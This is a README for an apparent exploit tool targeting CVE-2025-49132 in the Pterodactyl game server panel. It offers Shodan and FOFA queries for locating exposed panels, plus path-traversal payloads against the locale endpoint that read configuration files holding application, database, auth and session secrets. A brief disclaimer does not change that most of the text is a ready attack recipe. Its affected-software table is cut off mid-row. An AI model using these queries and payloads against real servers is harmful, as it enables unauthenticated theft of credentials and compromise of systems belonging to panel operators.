# CVE-2025-49132 — Pterodactyl RCE

> Exploit tool for **CVE-2025-49132** — a critical unauthenticated arbitrary code execution vulnerability affecting the **Pterodactyl** game server panel.

---

## 🧠 What is CVE-2025-49132 ?

A critical ACE flaw in the Pterodactyl panel that allows **unauthenticated remote attackers** to execute arbitrary code — potentially leading to **full system compromise**.

No auth needed. Just a vulnerable instance.

---

## ⚠️ Disclaimer

For **educational and authorized pentesting purposes only.**  
---

## 🔍 Reconnaissance

**Shodan**
```
http.title:"Pterodactyl"
```

**FOFA**
```
"Pterodactyl"
```

---

## 💉 Payloads

```
locales/locale.json?locale=../../../pterodactyl&namespace=config/app
locales/locale.json?locale=../../../pterodactyl&namespace=config/database
locales/locale.json?locale=../../../pterodactyl&namespace=config/auth
locales/locale.json?locale=../../../pterodactyl&namespace=config/session
```

---

## 📦 Installation

```bash
git clone https://github.com/yourname/CVE-2025-49132
cd CVE-2025-49132
pip install -r requirements.txt
```

---

## 🎯 Affected Software

| Software | Status |
|---|---|
| Pterodactyl Panel | 

---

## 📄 References

- [NVD - CVE-2025-49132](https://nvd.nist.gov/vuln/detail/CVE-2025-49132)
- [Pterodactyl](https://pterodactyl.io)
